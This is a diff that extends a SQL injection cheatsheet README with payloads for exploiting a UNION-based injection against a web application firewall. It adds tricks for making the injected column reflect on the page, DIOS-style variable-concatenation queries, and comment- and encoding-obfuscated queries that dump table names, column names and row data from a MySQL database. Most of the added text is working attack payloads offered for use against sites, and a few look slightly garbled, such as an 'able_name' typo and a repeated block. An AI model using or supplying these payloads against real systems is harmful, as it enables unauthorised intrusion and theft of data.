@@ -213,6 +213,31 @@ Website must successfully load and we will see a number (in our case between 1-4
 
 We bypassed the WAF and found that the 1st column has the information (please refer to the photo).
 
+### UNION SELECT case: The vulnerable column is not being displayed
+Sometimes when we manage to bypass the WAF when using **UNION SELECT** query, we don't see the vulnerable column printed out in the page source (or content). A solution would be to force the server print out the vulnerable column, by using the following tricks:  
+
+1) add **-** before the GET/POST parameter value, for example:  
+```sql
+?id=-7' UNION SELECT 1,2,3,4--+
+```
+
+2) add **.** before the GET/POST parameter value, for example:  
+```sql
+?id=.7' UNION SELECT 1,2,3,4--+
+```
+
+3) Use **AND 1** or **AND 0** after the GET/POST parameter value, for example:  
+```sql
+?id=7' AND 0 UNION SELECT 1,2,3,4--+
+```
+
+4) Use **DIV 0** or **DIV 1** after the GET/POST parameter value, for example:  
+```sql
+?id=7' DIV 1 UNION SELECT 1,2,3,4--+
+```
+
+**Note:** If **AND** or **DIV** are being blocked by WAF, consider using the alternative methods for [AND alternative](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/The%20Alternative%20way%20of%20using%20And%200%20in%20SQL%20Injection/README.md) and [NULL alternative](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/The%20Alternative%20way%20of%20using%20Null%20in%20SQL%20Injection/README.md)
+
 ## Retrieving the database  
 
 ### Dumping with DIOS  
@@ -297,10 +322,21 @@ Because the 1st column was being reflected to the website, we have to replace th
 
 - Convert the database name into 0xHEX: **0x6462313039**
 
-- Since we know the database name, let's dump tables name using this payload (using group_concat() ):
-```(SELECT+GROUP_CONCAT(table_name+SEPARATOR)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x6462313039)```  
+- Since we know the database name, let's dump tables name using this payload (using group_concat() ):  
+```sql
+(SELECT+GROUP_CONCAT(table_name+SEPARATOR)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x6462313039)
+```  
 
 - Our payload will be: ```http://domain.com/index.php?id=1' Union Select (SELECT+GROUP_CONCAT(able_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x6462313039),2,3,4-- -```  
+
+I've tested this query and most of the time it's effective, but there are some websites which for some reason, doesn't accept this query, so I came up with the following query to use in case of "emergency":  
+```sql
+(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x)
+```
+If WAF blocks the mentioned 2 queries, try using the following query (simple WAF bypass):  
+```sql
+(/*!%53ELECT*/+/*!50000GROUP_CONCAT(table_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.TABLES*//**//*!%57HERE*//**//*!TABLE_SCHEMA*//**/LIKE/**/DATABASE())
+```
 
 ![table_dumped](https://i.imgur.com/cUbdS47.png)
 
@@ -311,23 +347,62 @@ Now all the tables are all dumped. I will focus on the table names **intranetdir
 - Convert the table name into 0xHEX: **0x696e7472616e6574646972**
 
 - We will use this payload group_concat() to dump the columns:  
-```(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x696e7472616e6574646972)```
+```sql
+(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x696e7472616e6574646972)
+```
+Alternatively you can use the following query as well (same function, different approach):  
+```sql
+(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME=0x696e7472616e6574646972)AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,column_name,0x3c62723e)))))x)
+```
+Where **0x696e7472616e6574646972** is 0xHEX of table name (**intranetdir**).  
 
 - The final URL with Payload will be:  
 ```http://domain.com/index.php?id=1' Union Select (SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x696e7472616e6574646972),2,3,4-- -```  
 
 ![dumping_columns](https://i.imgur.com/pbIfSQV.png)
 
+If WAF blocks the mentioned 2 queries, try using the following query (simple WAF bypass where **0x696e7472616e6574646972** is **intranetdir** in 0xHEX format):  
+```sql
+(/*!%53ELECT*/+/*!50000GROUP_CONCAT(column_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.COLUMNS*//**//*!%57HERE*//**//*!TABLE_NAME*//**/LIKE/**/0x696e7472616e6574646972)
+```
+
 #### Retrieving the data inside the column
 
 All the columns of the name named **intranetdir** are dumped. In this case I will dump the data inside **name** column. For our final payload, we need to use database's name in 0xHEX, table's name in 0xHEX and column's name in 0xHEX.
 
-- database: **db109**
-table: **intranetdir**
-column: **name**
+- database: **db109**  
+table: **intranetdir**  
+column: **name**  
 
-- The final payload will be: ```(SELECT+GROUP_CONCAT(name+SEPARATOR+0x3c62723e)+FROM+db109.intranetdir)```
+- You can use the following 3 queries to dump the data from the column **name**: 
+```sql
+(SELECT+GROUP_CONCAT(name+SEPARATOR+0x3c62723e)+FROM+db109.intranetdir)
+```
+```sql
+(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(db109.intranetdir)WHERE(@x)IN(@x:=CONCAT(0x20,@x,name,0x3c62723e))))x)
+```
+```sql
+(SELECT+GROUP_CONCAT(0x3c62723e,name)+FROM (db109.intranetdir))
+```
 
-- The final URL + Payload will be: ```http://domain.com/index.php?id=1' Union Select (SELECT+GROUP_CONCAT(name+SEPARATOR+0x3c62723e)+FROM+db109.intranetdir),2,3,4-- -```
+- Let's use the first query (which I use the most). Assuming the 1st column is vulnerable, the final URL will be: 
+```sql
+http://domain.com/index.php?id=1' Union Select (SELECT+GROUP_CONCAT(name+SEPARATOR+0x3c62723e)+FROM+db109.intranetdir),2,3,4-- -
+```
+
+If the mentioned 3 queries are being blocked by WAF, consider using the following ones:  
+
+```sql
+(/*!%53ELECT*/+/*!50000GROUP_CONCAT(table_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.TABLES*//**//*!%57HERE*//**//*!TABLE_SCHEMA*//**/LIKE/**/DATABASE())
+```
+
+Note: **0x6e616d65** is **name** in 0xHEX format, convert it to your column name that you want to dump:  
+```sql
+(/*!%53ELECT*/+/*!50000GROUP_CONCAT(column_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.COLUMNS*//**//*!%57HERE*//**//*!TABLE_NAME*//**/LIKE/**/0x6e616d65)
+```
+
+```sql
+(/*!%53ELECT*/(@x)FROM(/*!%53ELECT*/(@x:=0x00),(@NR:=0),(/*!%53ELECT*/(0)/*!%46ROM*/(/*!%49NFORMATION_%53CHEMA*/./*!%54ABLES*/)/*!%57HERE*/(/*!%54ABLE_%53CHEMA*//**/NOT/**/LIKE/**/0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=/*!CONCAT%0a(*/@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,/*!%74able_%6eame*/,0x3c62723e))))x)
+```
 
 - Now we have dumped all the data inside **name** column.
